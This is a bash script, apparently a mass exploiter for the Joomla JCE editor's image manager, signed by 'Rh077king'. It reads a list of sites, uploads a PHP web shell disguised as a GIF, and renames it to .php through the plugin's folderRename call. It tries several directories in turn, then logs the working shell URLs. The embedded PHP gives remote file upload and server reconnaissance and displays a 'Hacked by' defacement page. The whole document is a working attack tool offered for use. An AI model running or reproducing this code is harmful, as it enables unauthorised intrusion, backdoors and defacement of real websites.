#!/bin/bash
# Jce 077 Exploiter 
# It's me Rh077king vaw
# E-Mail: cyberkingsquad077@gmail.com


LIST=$1

#!--------------------- Color Section ---------------#!
SET_COLOR()
{
BOLD="\033[1m"
RED="\e[1;31m"
GREEN="\e[1;32m"
YELLOW="\e[1;33m"
BLUE="\e[1;34m"
Cyan="\e[136m";
NOR="\e[0m"
}

#!--------------------- Parese URL ---------------#!

PARS_URL()
{
URL=`echo $TARGET | awk '{gsub("http://","")}1' | awk '{gsub("https://","")}1' | awk '{gsub("/",":")}1'`
HOSTX=$(echo "$URL" | cut -d ":" -f 1)
echo "$URL" | grep ":" >> /dev/null;check1=$?
if [ $check1 -eq 0 ];then
 DIR=$(echo "$URL" | cut -d ":" -f 2)
fi
if [ -z $DIR ];then
   PATH_ARRAY=("/")
else
   PATH_ARRAY=("/" "/$DIR/")
fi
}

#*************************************** Function Rename ***************************************#
Json2(){
curl --silent --max-time 10 --connect-timeout 10 -o /dev/null \
-H "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; de-LI; rv:1.9.0.16) Gecko/2009120208 Firefox/3.0.16 (.NET CLR 3.5.30729)" \
-H "Accept-Language: en-us,en;q=0.5" \
-H "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7" \
-H "X-Request: JSON" \
-H "Connection: Close" \
-H "Proxy-Connection: close" \
-F "${2}" \
--request POST  "http://${1}/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=156&format=raw"
}

#*************************************** Function Upload Rh077king *********************************#
UploadRh077king(){
curl --silent --max-time 10 --connect-timeout 10 -o /dev/null \
-H "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; de-LI; rv:1.9.0.16) Gecko/2009120208 Firefox/3.0.16 (.NET CLR 3.5.30729)" \
-H "Accept-Language: en-us,en;q=0.5" \
-H "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7" \
-H "Connection: Close" \
-H "Proxy-Connection: close" \
-F "upload-dir=${2}" \
-F "upload-overwrite=0" \
-F "action=upload" \
-F "Filedata=@Rh077king.gif" \
--request POST  "http://${1}/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form"
}

#********************************** Function Generate Shell ***********************************#
GENE_SH()
{
rand=`date +%s | sha256sum | base64 | head -c 6 ; echo`	

echo "<?php if(isset(\$_GET[\"$rand\"])){echo\"<font color=#FFFFFF>[uname]\".php_uname().\"[/uname]\";echo \"<br>\";print \"\n\";if(@ini_get(\"disable_functions\")){echo \"DisablePHP=\".@ini_get(\"disable_functions\");}else{ echo \"Disable PHP = NONE\";}echo \"<br>\";print \"\n\";if(@ini_get(\"safe_mode\")){echo \"Safe Mode = ON\";}else{ echo \"Safe Mode = OFF\";} echo \"<br>\";print "\n";echo\"<form method=post enctype=multipart/form-data>\";echo\"<input type=file name=f><input name=v type=submit id=v value=up><br>\";if(\$_POST[\"v\"]==up){if(@copy(\$_FILES[\"f\"][\"tmp_name\"],\$_FILES[\"f\"][\"name\"])){echo\"<b>Yup Man :D </b>-->\".\$_FILES[\"f\"][\"name\"];}else{echo\"<b>Fuck :| \";}}}?> <html><head><title>- Hacked by Rh077king -</title></head><center><body background=\"https://a.top4top.io/p_2027l5ooo0.gif\"><br><img src=\"https://b.top4top.io/p_2008f68fl0.jpeg\"><br><br><font size=\"+1\" color=\"red\"> ./Ghashghayi <font size=\"+1\" color=\"white\"> Hacker <br> <font size=\"+1\" color=\"white\"> Rh077king is here dear Admin fixed you're vulnerability <br><font size=\"+1\" font color=\"red\">Cyber king squad <font color=\"white\"> Wase Here ... <br><img src=\"hhttps://b.top4top.io/p_2008f68fl0.jpeg\"></center></body></html><!-- <?php echo md5(behnam); ?> --> " > Rh077king.gif

UploadRh077king ${HOSTX}${DIR}  $1
Json2 "${HOSTX}${DIR}" "json={\"fn\":\"folderRename\",\"args\":[\"${1}Rh077king.gif\",\"Rh077king.php\"]}"


curl --silent --max-time 10 --connect-timeout 10 -A "Mozilla/5.0" "http://${HOSTX}${DIR}/${2}/Rh077king.php"  | grep -i "Hacked" >/dev/null;gck1=$?
            if [ $gck1 -eq 0 ];then
		echo -e "		 > $BOLD$RED shell : http://${HOSTX}${DIR}/$2/Rh077king.php?$rand :D $NOR"
                echo  "http://${HOSTX}${DIR}/$2/Rh077king.php?$rand" >> shells.txt
	    fi
}


UploadC(){
curl --silent --max-time 10 --connect-timeout 10 -o /dev/null \
-H "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; de-LI; rv:1.9.0.16) Gecko/2009120208 Firefox/3.0.16 (.NET CLR 3.5.30729)" \
-H "Accept-Language: en-us,en;q=0.5" \
-H "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7" \
-H "Connection: Close" \
-H "Proxy-Connection: close" \
-F "upload-dir=${2}" \
-F "upload-overwrite=0" \
-F "action=upload" \
-F "Filedata=@Rh077king.gif" \
--request POST  "http://${1}/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form"
}


MethodB()
{
      UploadC $1 /../../
        curl --silent --max-time 10 --connect-timeout 10 -A "Mozilla/5.0" "http://$1/Rh077king.gif" | grep -i "Hacked" >/dev/null;gck=$?
        if [ $gck -eq 0 ];then
	   echo -e "		>$BOLD$GREEN http://$1/Rh077king.gif  $NOR "
         echo "http://$1/Rh077king.gif " >> hacked.lst
	 GENE_SH /../../ 
	else
	  UploadC $1 /../../tmp/ 
		curl --silent --max-time 10 --connect-timeout 10 -A "Mozilla/5.0" "http://$1/tmp/Rh077king.gif" | grep -i "Hacked" >/dev/null;gck=$?
		        if [ $gck -eq 0 ];then
			   echo -e "		>$BOLD$GREEN http://$1/tmp/Rh077king.gif  $NOR "
			 echo "http://$1/tmp/Rh077king.gif " >> hacked.lst
			 GENE_SH /../../tmp/ tmp
				else
					UploadC $1 /../../media/
					curl --silent --max-time 10 --connect-timeout 10 -A "Mozilla/5.0" "http://$1/media/Rh077king.gif" | grep -i "Hacked" >/dev/null;gck=$?
		                         if [ $gck -eq 0 ];then
			                      echo -e "		>$BOLD$GREEN http://$1/media/Rh077king.gif  $NOR "
					         echo "http://$1/media/Rh077king.gif " >> hacked.lst
						GENE_SH /../../media/ media
						else
						 UploadC $1 /../../templates/
						 curl --silent --max-time 10 --connect-timeout 10 -A "Mozilla/5.0" "http://$1/templates/Rh077king.gif" | grep -i "Hacked" >/dev/null;gck=$?
		                      		   if [ $gck -eq 0 ];then
							     echo -e "		>$BOLD$GREEN http://$1/templates/Rh077king.gif  $NOR " 						     
						             echo "http://$1/template/Rh077king.gif " >> hacked.lst
							GENE_SH /../../templates/ templates
							else
							 UploadC $1 /../
							 curl --silent --max-time 10 --connect-timeout 10 -A "Mozilla/5.0" "http://$1/images/Rh077king.gif" | grep -i "Hacked" >/dev/null;gck=$?
		                      			   if [ $gck -eq 0 ];then
								         echo "http://$1/images/Rh077king.gif " >> hacked.lst
							     echo -e "		>$BOLD$GREEN http://$1/images/Rh077king.gif  $NOR"
								GENE_SH /../ images
	  						   fi
	  					   fi
	  				 fi
			fi
        fi         

} 

usage() {
echo -e "$BOLD$YELLOW		> Usage: $0 list.txt$NOR"
exit 1
}

check() {
if [ ! -f $LIST ] ; then
echo -e "$BOLD$YELLOW		> cannot access $LIST: No such file $NOR"
exit 1
fi
}

main()
{

for TARGET in `cat $LIST`
do
		PARS_URL
	        for XDIR in `echo ${PATH_ARRAY[*]}`
		   do
	        	echo -e "	       >$BOLD [^]$BLUE Exploiting$NOR ${HOSTX}"
			MethodB $TARGET;
		echo "	----------------------------------------------------"
		   done	
done
}


SET_COLOR;

echo ""
echo -e "             -.-.-.-.-.-.-.-.-#-#-#-#-#-#-#-#-#-#-.-.-.-.-.-.-.-$NOR"
echo -e "           - $GREEN             [JCE 077 Exploiter  $NOR                 -$NOR"
echo -e "         -$GREEN             Version : 0.1                    $NOR          -$NOR"
echo -e "-#-#-#-#-$GREEN      Cod3d By:$NOR$RED Rh077king 	  	                    $NOR-#-#-#-#-$NOR"
echo -e "         -$GREEN            @Rh077king        	         $NOR          -$NOR"
echo -e "           -$GREEN               https://telegram.me/Rh077king   $NOR 	  -$NOR"
echo -e "             -.-.-.-.-.-.-.-.-#-#-#-#-#-#-#-#-#-#-.-.-.-.-.-.-.-$NOR"
echo ""

if [ $# -ne 1 ]; 
    then usage
fi

check

main;
